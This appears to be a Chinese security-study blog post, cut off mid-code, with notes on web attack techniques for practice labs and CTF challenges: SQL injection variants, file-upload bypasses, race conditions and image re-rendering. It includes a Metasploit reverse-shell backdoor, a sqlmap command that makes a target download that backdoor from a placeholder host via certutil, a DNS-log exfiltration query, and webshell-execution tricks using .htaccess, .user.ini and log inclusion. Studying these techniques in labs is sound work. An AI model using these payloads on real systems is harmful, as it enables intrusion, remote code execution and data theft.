{"title":"WEB攻防-通用漏洞","uid":"11932efbcdc3039b003ba34e280dee13","slug":"WEB攻防-通用漏洞","date":"2024-03-05T15:07:08.000Z","updated":"2024-03-11T03:19:23.545Z","comments":true,"path":"api/articles/WEB攻防-通用漏洞.json","keywords":null,"cover":null,"content":"<p>大型靶场<a href=\"https://vulhub.org/#/environments/\">Vulhub - Docker-Compose file for vulnerability environment</a></p>\n<h2 id=\"SQL注入-补充内容\"><a href=\"#SQL注入-补充内容\" class=\"headerlink\" title=\"SQL注入-补充内容\"></a>SQL注入-补充内容</h2><h3 id=\"ACCESS注入\"><a href=\"#ACCESS注入\" class=\"headerlink\" title=\"ACCESS注入\"></a>ACCESS注入</h3><h4 id=\"偏移注入\"><a href=\"#偏移注入\" class=\"headerlink\" title=\"偏移注入\"></a>偏移注入</h4><h5 id=\"使用场景\"><a href=\"#使用场景\" class=\"headerlink\" title=\"使用场景\"></a>使用场景</h5><ul>\n<li>知道表名</li>\n<li>不知道列名</li>\n<li>列名特殊, 无法爆破</li>\n</ul>\n<h5 id=\"注入原理\"><a href=\"#注入原理\" class=\"headerlink\" title=\"注入原理\"></a>注入原理</h5><ul>\n<li><p>假设一个表有8个字段，admin表有3个字段。(需要先判断列数)</p>\n</li>\n<li><p>联合查询payload：union select 1,2,3,4,5,6,7,8 from admin </p>\n</li>\n<li><p>在我们不知道admin有多少字段的情况下可以尝试payload：union select 1,2,3,4,5,6,7,admin.* from admin，此时页面出错</p>\n</li>\n<li><p>直到payload：union select 1,2,3,4,5,admin.* from admin时页面返回正常，说明admin表有三个字段</p>\n</li>\n<li><p>然后通过移动admin.*的位置，就可以回显不同的数据</p>\n</li>\n</ul>\n<h3 id=\"MYSQL\"><a href=\"#MYSQL\" class=\"headerlink\" title=\"MYSQL\"></a>MYSQL</h3><ul>\n<li><p>读取文件</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">select load_file(&#39;D:/a.txt&#39;);</span></span></code></pre></div></li>\n<li><p>写入文件</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">select &#39;xxxx&#39; into outfile &#39;D:/a.txt&#39;;</span></span></code></pre></div></li>\n</ul>\n<h3 id=\"sqlmap\"><a href=\"#sqlmap\" class=\"headerlink\" title=\"sqlmap\"></a>sqlmap</h3><ul>\n<li><a href=\"https://www.cnblogs.com/bmjoker/p/9326258.html\">1. sqlmap超详细笔记+思维导图 - bmjoker - 博客园 (cnblogs.com)</a></li>\n</ul>\n<h4 id=\"sqlmap联动msf\"><a href=\"#sqlmap联动msf\" class=\"headerlink\" title=\"sqlmap联动msf\"></a>sqlmap联动msf</h4><ul>\n<li><p>攻击者服务器msf生成后门</p>\n<div class=\"language-bash\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">bash</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #FFCB6B\">msfvenom</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">-p</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">windows/meterpreter/reverse_http</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">lhost=服务器地址</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">lport=端口</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">-f</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">exe</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">-o</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">sql.exe</span></span></code></pre></div></li>\n<li><p>开启监听：</p>\n<div class=\"language-bash\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">bash</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #FFCB6B\">msf6&gt;</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">use</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">exploit/multi/handler</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">msf6&gt;</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">set</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">lhost</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0.0</span><span style=\"color: #C3E88D\">.0.0</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">msf6&gt;</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">set</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">lport</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">6666</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">msf6&gt;</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">run</span></span></code></pre></div></li>\n<li><p>sqlmap实现访问下载后门文件</p>\n<div class=\"language-bash\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">bash</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #FFCB6B\">python</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">sqlmap.py</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">-u</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">url</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">--os-cmd=</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">certutil -urlcache -split -f http://xxxx/sql.exe c:/sql.exe</span><span style=\"color: #89DDFF\">&quot;</span></span></code></pre></div></li>\n</ul>\n<h4 id=\"脚本使用\"><a href=\"#脚本使用\" class=\"headerlink\" title=\"脚本使用\"></a>脚本使用</h4><p>工具无法自动判断加密&#x2F;编码类型和数据格式(如json), 需要手工注入进行判断</p>\n<ul>\n<li>例如, 用base64编码payload:<div class=\"language-bash\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">bash</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #FFCB6B\">python</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">sqlmap.py</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">-u</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">url</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">--tamper=base64encode.py</span></span></code></pre></div></li>\n</ul>\n<h4 id=\"基于堆叠注入-绕过select过滤\"><a href=\"#基于堆叠注入-绕过select过滤\" class=\"headerlink\" title=\"(基于堆叠注入)绕过select过滤\"></a>(基于堆叠注入)绕过select过滤</h4><p><a href=\"https://www.cnblogs.com/cmredkulaa/p/14563311.html\">几种绕过select过滤的姿势 - 2hangG3 - 博客园 (cnblogs.com)</a></p>\n<ul>\n<li><p>原语句:</p>\n<div class=\"language-sql\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">sql</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #F78C6C\">1</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">;select flag from `1919810931114514`;</span></span></code></pre></div></li>\n<li><p>由于<code>return preg_match(&quot;/select|update|delete|drop|insert|where|\\./i&quot;,$inject);</code>select被过滤</p>\n</li>\n<li><p>改为:</p>\n<div class=\"language-sql\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">sql</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #F78C6C\">1</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">;set @sql = CONCAT(</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #BABED8\">se</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">,</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #BABED8\">lect </span><span style=\"color: #89DDFF\">*</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">from</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">`</span><span style=\"color: #C3E88D\">1919810931114514</span><span style=\"color: #89DDFF\">`</span><span style=\"color: #BABED8\">;</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">);prepare stmt from @sql;EXECUTE stmt;</span></span></code></pre></div></li>\n<li><p>解析:</p>\n<ul>\n<li><div class=\"language-sql\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">sql</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #F78C6C\">sEt</span><span style=\"color: #BABED8\"> @sql </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">CONCAT</span><span style=\"color: #BABED8\">(</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">se</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #BABED8\">,</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">lect * from `1919810931114514`;</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #BABED8\">);</span></span></code></pre></div><ul>\n<li><code>set</code>用于设置变量名和值</li>\n<li><code>CONCAT</code><strong>拼接语句, 绕过过滤</strong></li>\n</ul>\n</li>\n<li><div class=\"language-sql\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">sql</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #BABED8\">prepare stmt </span><span style=\"color: #F78C6C\">from</span><span style=\"color: #BABED8\"> @sql;</span></span></code></pre></div><p><code>prepare</code>用于预备一个语句，并赋予名称，以后可以引用该语句</p>\n</li>\n<li><div class=\"language-sql\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">sql</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"></span></code></pre></div></li>\n</ul>\n<p>  EXECUTE stmt;</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\"></span></span>\n<span class=\"line\"><span style=\"color: #babed8\">`execute`执行语句</span></span></code></pre></div></li>\n</ul>\n<h3 id=\"二次注入\"><a href=\"#二次注入\" class=\"headerlink\" title=\"二次注入\"></a>二次注入</h3><h5 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h5><ul>\n<li>普通注入: 数据直接进入到 SQL 查询中</li>\n<li>二次注入: 输入数据经处理后<strong>存储</strong>, 取出后, <strong>再次</strong>进入到 SQL 查询</li>\n</ul>\n<h5 id=\"过程\"><a href=\"#过程\" class=\"headerlink\" title=\"过程\"></a>过程</h5><ul>\n<li>插入<code>1‘#</code></li>\n<li>被转义成<code>1\\’#</code></li>\n<li>不能注入，但是<strong>保存在数据库</strong>时变成了原来的<code>1’#</code></li>\n<li>利用<code>1’#</code>进行注入,这里利用时要求取出数据时不转义</li>\n</ul>\n<h5 id=\"案例\"><a href=\"#案例\" class=\"headerlink\" title=\"案例\"></a>案例</h5><p><a href=\"https://buuoj.cn/challenges#[%E7%BD%91%E9%BC%8E%E6%9D%AF2018]Unfinish\">网鼎杯2018-Unfinish</a></p>\n<ul>\n<li>注册时在<code>username</code>注入sql语句</li>\n<li>此时数据被转义, <strong>无法注入</strong></li>\n<li>利用邮箱登录后重新加载<code>username</code>, 此时没有转义, 注入语句成功执行</li>\n</ul>\n<h3 id=\"DNS注入\"><a href=\"#DNS注入\" class=\"headerlink\" title=\"DNS注入\"></a>DNS注入</h3><ul>\n<li>DNS协议：将域名转化为IP 日志 &#x3D;&gt; 记录了域名转化IP请求</li>\n</ul>\n<p><em><strong>DNS注入的核心，将盲注转化为显错注入</strong></em></p>\n<ul>\n<li>payload例子:</li>\n</ul>\n<div class=\"language-sql\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">sql</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #F78C6C\">select</span><span style=\"color: #BABED8\"> load_file(</span><span style=\"color: #82AAFF\">concat</span><span style=\"color: #BABED8\">(</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">//</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #BABED8\">,(</span><span style=\"color: #F78C6C\">select</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">database</span><span style=\"color: #89DDFF\">()</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">limit</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0</span><span style=\"color: #BABED8\">,</span><span style=\"color: #F78C6C\">1</span><span style=\"color: #BABED8\">),</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">.81k8pu.dnslog.cn/abc</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #BABED8\">));</span></span></code></pre></div><h2 id=\"文件上传\"><a href=\"#文件上传\" class=\"headerlink\" title=\"文件上传\"></a>文件上传</h2><p>靶场: <a href=\"https://github.com/c0ny1/upload-labs\">c0ny1&#x2F;upload-labs: 一个想帮你总结所有类型的上传漏洞的靶场 (github.com)</a></p>\n<p>推荐文章: <a href=\"https://zhuanlan.zhihu.com/p/631648316\">一文爽 文件上传漏洞原理、方法和类型详细解析 - 知乎 (zhihu.com)</a></p>\n<h3 id=\"解析执行\"><a href=\"#解析执行\" class=\"headerlink\" title=\"解析执行\"></a>解析执行</h3><h4 id=\"user-ini\"><a href=\"#user-ini\" class=\"headerlink\" title=\".user.ini\"></a>.user.ini</h4><ul>\n<li>可以上传一个.user,ini文件, 自定义以php解析特定文件, 例如<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">auto_prepend_file=test.txt</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">//或者</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">auto_append_file=test.txt</span></span></code></pre></div></li>\n</ul>\n<h4 id=\"htaccess\"><a href=\"#htaccess\" class=\"headerlink\" title=\".htaccess\"></a>.htaccess</h4><h5 id=\"原理-1\"><a href=\"#原理-1\" class=\"headerlink\" title=\"原理\"></a>原理</h5><ul>\n<li>.htaccess文件是Apache服务器中的一个配置文件</li>\n<li>.apache配置文件为AllowOverride All(默认为None)</li>\n</ul>\n<h5 id=\"条件\"><a href=\"#条件\" class=\"headerlink\" title=\"条件\"></a>条件</h5><ul>\n<li>Apache开启rewrite模块</li>\n</ul>\n<h5 id=\"示例\"><a href=\"#示例\" class=\"headerlink\" title=\"示例\"></a>示例</h5><div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">&lt;FilesMatch&quot;x.png&quot;&gt;</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">SetHandlerapplication/x-httpd-php</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">&lt;/FilesMatch&gt;</span></span></code></pre></div><ul>\n<li>x.png是代码将该目录下文件叫x.png的文件以php进行执行</li>\n<li>上传.htaccess，上传一张名叫x.png的文件，即可执行</li>\n</ul>\n<h3 id=\"过滤绕过\"><a href=\"#过滤绕过\" class=\"headerlink\" title=\"过滤绕过\"></a>过滤绕过</h3><h4 id=\"绕过过滤\"><a href=\"#绕过过滤\" class=\"headerlink\" title=\"绕过&lt;?php?&gt;过滤\"></a>绕过&lt;?php?&gt;过滤</h4><ul>\n<li><code>&lt;?   ?&gt;</code>需要开启短标签开关，short_open_tag</li>\n<li><code>&lt;?= ?&gt;</code>PHP版本&gt;PHP 5.4.0</li>\n<li><code>&lt;% %&gt;</code>asp_tags设成On</li>\n<li><code>&lt;script language=&quot;php&quot;&gt;&lt;/script&gt;</code>php7之后就不能用了</li>\n</ul>\n<h4 id=\"利用反引号-绕过\"><a href=\"#利用反引号-绕过\" class=\"headerlink\" title=\"利用反引号&#96;&#96;绕过\"></a>利用反引号&#96;&#96;绕过</h4><ul>\n<li>反引号运算符”&#96;”相当于 “shell_exec() “函数, 将里面的内容作为shell命令来执行</li>\n</ul>\n<h4 id=\"包含日志\"><a href=\"#包含日志\" class=\"headerlink\" title=\"包含日志\"></a>包含日志</h4><ul>\n<li><p>将后门代码写入UA头中</p>\n</li>\n<li><p>写入.user.ini配置文件，将日志文件内容通过文件包含访问</p>\n</li>\n<li><p>例如:</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">user.ini:auto_prepend_file-test.png</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">test.png:&lt;?=include&quot;/var/lo&quot;.&quot;g/nginx/access.lo&quot;.&quot;g&quot;?&gt;</span></span></code></pre></div></li>\n</ul>\n<h4 id=\"短网址绕过”-”\"><a href=\"#短网址绕过”-”\" class=\"headerlink\" title=\"短网址绕过”.”\"></a>短网址绕过”.”</h4><ul>\n<li>在需要远程文件包含, 但过滤了点号<code>.</code>时, 可以使用短链接</li>\n<li>比如<code>http://47.94.236.117/</code>转换为<code>http://794750069/</code>就可以绕过过滤</li>\n</ul>\n<h3 id=\"文件头检测\"><a href=\"#文件头检测\" class=\"headerlink\" title=\"文件头检测\"></a>文件头检测</h3><ul>\n<li><p>文件头部检测是否为图片格式文件, 如图像会检测头部是否为<code>GIF89a</code></p>\n</li>\n<li><h2 id=\"可在文件头部添加该特征绕过检测-例如-user-ini-GIF89Aauto-prepend-file-test-png\"><a href=\"#可在文件头部添加该特征绕过检测-例如-user-ini-GIF89Aauto-prepend-file-test-png\" class=\"headerlink\" title=\"可在文件头部添加该特征绕过检测, 例如&#96;&#96;&#96;user ini:GIF89Aauto_prepend_file&#x3D;test.png\"></a>可在文件头部添加该特征绕过检测, 例如<br>&#96;&#96;&#96;<br>user ini:<br>GIF89A<br>auto_prepend_file&#x3D;test.png</h2><p>test.png:<br>GIF89A</p>\n<?=include\"/var/lo\".\"g/nginx/access.lo\".\"g\"?>\n</li>\n<li><p><a href=\"https://www.cnblogs.com/WangAoBo/p/6366211.html\">常见文件的文件头标志 - M4x - 博客园 (cnblogs.com)</a></p>\n</li>\n</ul>\n<h3 id=\"条件竞争\"><a href=\"#条件竞争\" class=\"headerlink\" title=\"条件竞争\"></a>条件竞争</h3><p><a href=\"https://blog.csdn.net/weixin_45588247/article/details/118796606?spm=1001.2014.3001.5501\">【文件上传绕过】——条件竞争漏洞-CSDN博客</a></p>\n<h4 id=\"漏洞原理\"><a href=\"#漏洞原理\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h4><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>服务器端在处理不同用户的请求时是并发进行的，因此，如果<strong>并发处理不当</strong>或相关<strong>操作逻辑顺序</strong>设计的不合理时，将会导致此类问题的发生</p>\n<p>例如:</p>\n<ul>\n<li>上传文件源代码里没有校验上传的文件</li>\n<li>上传成功后才进行判断</li>\n<li>如果文件格式符合要求，则重命名，如果文件格式不符合要求，将文件删除</li>\n</ul></blockquote>\n<h4 id=\"利用\"><a href=\"#利用\" class=\"headerlink\" title=\"利用\"></a>利用</h4><ul>\n<li>营造10000人同时上传文件1.php的情境, 另外有10000人在同时访问这个1.php</li>\n<li>上传文件时，这个文件会有<strong>一段时间</strong>留存在服务器的上传目录下</li>\n<li>而服务器脚本在进行判断文件是否合法而对文件进行删除时，会有<strong>一定的处理时间</strong></li>\n<li>可能在某个时间里，<strong>服务器还未来得及删除文件</strong>,</li>\n<li>此时利用1.php<strong>重新生成</strong>一个php文件</li>\n</ul>\n<h3 id=\"二次渲染\"><a href=\"#二次渲染\" class=\"headerlink\" title=\"二次渲染\"></a>二次渲染</h3><p><a href=\"https://blog.csdn.net/qq_40800734/article/details/105920149\">文件上传之二次渲染绕过_二次渲染绕过怎么操作-CSDN博客</a></p>\n<p><a href=\"https://blog.csdn.net/weixin_45588247/article/details/119177948\">【文件上传绕过】——二次渲染漏洞_二次渲染绕过-CSDN博客</a></p>\n<h4 id=\"二次渲染原理\"><a href=\"#二次渲染原理\" class=\"headerlink\" title=\"二次渲染原理\"></a>二次渲染原理</h4><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p> 在我们上传文件后，网站会对图片进行二次处理（格式、尺寸要求等），服务器会根据我们原有的图片<strong>生成</strong>一个<strong>新的图片</strong>并放到网站对应的标签进行显示。</p></blockquote>\n<h4 id=\"识别\"><a href=\"#识别\" class=\"headerlink\" title=\"识别\"></a>识别</h4><ul>\n<li>检查上传前后图片文件大小是否更改</li>\n</ul>\n<h4 id=\"绕过\"><a href=\"#绕过\" class=\"headerlink\" title=\"绕过\"></a>绕过</h4><ul>\n<li>使用脚本生成图片马, 例如:<div class=\"language-php\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">php</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #89DDFF\">&lt;?</span><span style=\"color: #BABED8\">php</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">$</span><span style=\"color: #BABED8\">p </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">array</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #F78C6C\">0xa3</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0x9f</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0x67</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0xf7</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0x0e</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0x93</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0x1b</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0x23</span><span style=\"color: #89DDFF\">,</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">           </span><span style=\"color: #F78C6C\">0xbe</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0x2c</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0x8a</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0xd0</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0x80</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0xf9</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0xe1</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0xae</span><span style=\"color: #89DDFF\">,</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">           </span><span style=\"color: #F78C6C\">0x22</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0xf6</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0xd9</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0x43</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0x5d</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0xfb</span><span style=\"color: #89DDFF\">,</span><span style=\"color: 